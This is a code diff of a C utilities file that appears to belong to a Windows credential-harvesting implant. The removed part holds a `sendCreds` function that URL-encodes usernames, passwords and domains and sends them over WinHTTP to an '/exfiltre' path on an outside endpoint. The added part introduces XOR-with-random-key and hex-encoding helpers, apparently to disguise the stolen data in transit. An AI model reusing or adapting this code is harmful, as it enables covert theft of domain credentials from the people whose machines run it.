@@ -1,123 +1,58 @@
 #include "pch.h"
 #include "utils.h"
 
-static wchar_t* urlEncode(const wchar_t* str)
-{
-    size_t len = wcslen(str);
-    size_t new_len = 0;
-    const wchar_t* p = str;
-    wchar_t c;
-    wchar_t* new_str;
-    wchar_t* q;
-
-    // Calculate the length of the encoded string.
-    while (*p)
-    {
-        c = *p++;
-        if (c == L' ')
-        {
-            new_len += 3;
-        }
-        else if (iswalnum(c) || c == L'-' || c == L'_' || c == L'.' || c == L'~')
-        {
-            new_len += 1;
-        }
-        else
-        {
-            new_len += 3;
-        }
-    }
-
-    // Allocate memory for the encoded string.
-    new_str = (wchar_t*)LocalAlloc(LPTR, (new_len + 1) * sizeof(wchar_t));
-    if (!new_str)
-    {
+char* wcharToChar(const wchar_t* wstr) {
+    int len = wcslen(wstr) + 1;
+    if (len < 0) {
+        // Error occurred
         return NULL;
     }
 
-    // Encode the string.
-    q = new_str;
-    p = str;
-    while (*p)
-    {
-        c = *p++;
-        if (c == L' ')
-        {
-            *q++ = L'%';
-            *q++ = L'2';
-            *q++ = L'0';
-        }
-        else if (iswalnum(c) || c == L'-' || c == L'_' || c == L'.' || c == L'~')
-        {
-            *q++ = c;
-        }
-        else
-        {
-            swprintf(q, 4, L"%%%02X", (unsigned char)c);
-            q += 3;
-        }
+    char* str = LocalAlloc(LPTR, (len + 1) * sizeof(char));
+    if (!str) {
+        // Memory allocation failed
+        return NULL;
     }
-
-    // Terminate the encoded string.
-    *q = L'\0';
-
-    return new_str;
+    size_t converted;
+    wcstombs_s(&converted, str, len + 1, wstr, len + 1);
+    return str;
 }
 
-BOOL sendCreds(LPWSTR username, LPWSTR password, LPWSTR domain) {
+void xorWithKey(BYTE* data, size_t dataLen, BYTE* key, size_t keyLen) {
+    for (size_t i = 0; i < dataLen; i++) {
+        data[i] ^= key[i % keyLen];
+    }
+    return;
+}
 
-    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
-    BOOL bResults = FALSE;
-    DWORD dwSize = 0;
-    DWORD dwDownloaded = 0;
-    LPSTR pszOutBuffer = NULL;
-    DWORD dw = 0;
+char* generateKey(size_t keyLen) {
+    BYTE* key = LocalAlloc(LPTR, keyLen + 1);
+    DWORD val;
 
-    // Initialize WinHTTP.
-    if (!(hSession = WinHttpOpen(USERAGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
-        return FALSE;
+    if (!key) {
+        return NULL;
+    }
 
-    // Connect to the server.
-    if (!(hConnect = WinHttpConnect(hSession, HTTPS_ENDPOINT, INTERNET_DEFAULT_HTTP_PORT, 0)))
-        return FALSE;
+    char hex[] = "0123456789abcdef";
+    for (size_t i = 0; i < keyLen; i++) {
+        RtlGenRandom(&val, sizeof(val));
+        key[i] = hex[val % 16];
+    }
+    key[keyLen] = '\0';
+    return key;
+}
 
-    WCHAR request[BUFFER_SIZE] = { 0 };
-    WCHAR* encodedUsername = NULL;
-    WCHAR* encodedPassword = NULL;
-    WCHAR* encodedDomain = NULL;
+char* charToHex(char* str, size_t sizestr) {
+    size_t size = sizestr * 2 + 1;
+    char* ret = LocalAlloc(LPTR, (size) * sizeof(char));
+    if (!ret) {
+        return NULL;
+    }
 
-    encodedUsername = urlEncode(username);
-    encodedPassword = urlEncode(password);
-    encodedDomain = urlEncode(domain);
+    ZeroMemory(ret, size);
 
-    ////printf("password(%lu): %ls\n", encodedUsername, dw);
-
-    wcscat_s(request, BUFFER_SIZE, L"/exfiltre?username=");
-
-    wcscat_s(request, BUFFER_SIZE, encodedUsername);
-    wcscat_s(request, BUFFER_SIZE, L"&password=");
-    wcscat_s(request, BUFFER_SIZE, encodedPassword);
-    wcscat_s(request, BUFFER_SIZE, L"&domain=");
-    wcscat_s(request, BUFFER_SIZE, encodedDomain);
-
-
-
-    // Create the request.
-    if (!(hRequest = WinHttpOpenRequest(hConnect, L"GET", request, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0)))
-        return FALSE;
-
-    // Send the request.
-    if (!(bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)))
-        return FALSE;
-
-
-
-    // Clean up.
-    LocalFree(encodedDomain);
-    LocalFree(encodedPassword);
-    LocalFree(encodedUsername);
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
-    return TRUE;
+    for (size_t i = 0; i < sizestr; i++) {
+        snprintf(ret + 2 * i, size - 2 * i, "%02x", str[i]);
+    }
+    return ret;
 }
